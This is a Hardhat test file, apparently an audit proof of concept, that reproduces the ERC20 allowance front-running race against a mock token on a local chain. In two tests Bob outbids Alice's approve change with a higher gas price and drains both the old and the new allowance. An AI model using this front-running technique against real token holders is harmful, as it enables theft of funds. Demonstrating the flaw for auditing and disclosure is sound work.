const { expect } = require("chai");
const { ethers } = require("hardhat");
const helpers = require("@nomicfoundation/hardhat-toolbox/network-helpers");

describe("PoC: ERC20 Allowance Front-Running", function () {
    let mockToken;
    let owner, minter, alice, bob;
    let provider;

    beforeEach(async function () {
        [owner, minter, pauser, alice, bob] = await ethers.getSigners();
        provider = ethers.provider;

        mockToken = await ethers.deployContract("MockToken", [minter, pauser]);

        // Mint tokens for Alice
        await mockToken.connect(minter).mint(alice.address, ethers.parseUnits("5000", 18));

        // Alice approves Bob to spend 1000 tokens
        await mockToken.connect(alice).approve(bob.address, ethers.parseUnits("1000", 18));
    });

    it("Should allow Bob to front-run Alice's allowance reduction", async function () {

        expect(await mockToken.allowance(alice.address, bob.address)).to.equal(ethers.parseUnits("1000", 18));

        // Disable auto mining for manual control
        await provider.send("evm_setAutomine", [false]);

        // Alice attempts to reduce Bob’s allowance to 100 tokens
        await mockToken.connect(alice).approve(bob.address, ethers.parseUnits("100", 18), { gasPrice: ethers.parseUnits("100", "gwei"), gasLimit: 80000 });

        // Bob front-runs the transaction and transfers all 1000 tokens before the reduction is mined
        await mockToken.connect(bob).transferFrom(alice.address, bob.address, ethers.parseUnits("1000", 18), { gasPrice: ethers.parseUnits("200", "gwei"), gasLimit: 150000 });

        // Both transactions are now in the mempool
        let pendingBlock = await network.provider.send("eth_getBlockByNumber", [
            "pending",
            false,
        ]);
        console.log("Pending block transactions: ", pendingBlock);

        // Mine the block manually to simulate validator behavior, transaction with the more profitable gas amount will be choosen by the validator
        await provider.send("evm_mine");

        // Both transaction have been mined
        pendingBlock = await network.provider.send("eth_getBlockByNumber", [
            "pending",
            false,
        ]);
        console.log("Pending block transactions: ", pendingBlock);

        // Re-enable auto mining for future tests
        await provider.send("evm_setAutomine", [true]);

        // Check balances
        expect(await mockToken.balanceOf(bob.address)).to.equal(ethers.parseUnits("1000", 18)); // Bob got all the tokens
        expect(await mockToken.balanceOf(alice.address)).to.equal(ethers.parseUnits("4000", 18)); // Alice lost 1000 tokens (900 more than intended)

        // Alice’s approval reduction is now useless and can still be taken by Bob
        expect(await mockToken.allowance(alice.address, bob.address)).to.equal(ethers.parseUnits("100", 18));

        // Bob takes the last 100 tokens
        await mockToken.connect(bob).transferFrom(alice.address, bob.address, ethers.parseUnits("100", 18));

        // Check balances again
        expect(await mockToken.balanceOf(bob.address)).to.equal(ethers.parseUnits("1100", 18)); // Bob got the additional 100 tokens
        expect(await mockToken.balanceOf(alice.address)).to.equal(ethers.parseUnits("3900", 18)); // Alice is now down another 100 tokens
    });

    it("Should allow Bob to front-run Alice's allowance increase and get extra allowance", async function () {

        // Disable auto mining for manual control
        await provider.send("evm_setAutomine", [false]);

        // Alice attempts to increase Bob’s allowance to 2000 tokens
        await mockToken.connect(alice).approve(bob.address, ethers.parseUnits("2000", 18), { gasPrice: ethers.parseUnits("50", "gwei"), gasLimit: 80000 });

        // Bob front-runs by spending 1000 tokens first with higher gas price
        await mockToken.connect(bob).transferFrom(alice.address, bob.address, ethers.parseUnits("1000", 18), { gasPrice: ethers.parseUnits("200", "gwei"), gasLimit: 150000 });

        // Mine the block manually to simulate validator behavior
        await provider.send("evm_mine");

        // Re-enable auto mining for future tests
        await provider.send("evm_setAutomine", [true]);

        // Bob should still have 2000 allowance remaining due to front-running
        expect(await mockToken.allowance(alice.address, bob.address)).to.equal(ethers.parseUnits("2000", 18));

        // Bob takes the remaining 2000 tokens, 1000 more than Alice intended
        await mockToken.connect(bob).transferFrom(alice.address, bob.address, ethers.parseUnits("2000", 18), { gasPrice: ethers.parseUnits("200", "gwei"), gasLimit: 150000 });

        // Check balances
        expect(await mockToken.balanceOf(bob.address)).to.equal(ethers.parseUnits("3000", 18)); // Bob has 3000 instead of 2000
        expect(await mockToken.balanceOf(alice.address)).to.equal(ethers.parseUnits("2000", 18)); // Alice has 2000 instead of 3000
    });

});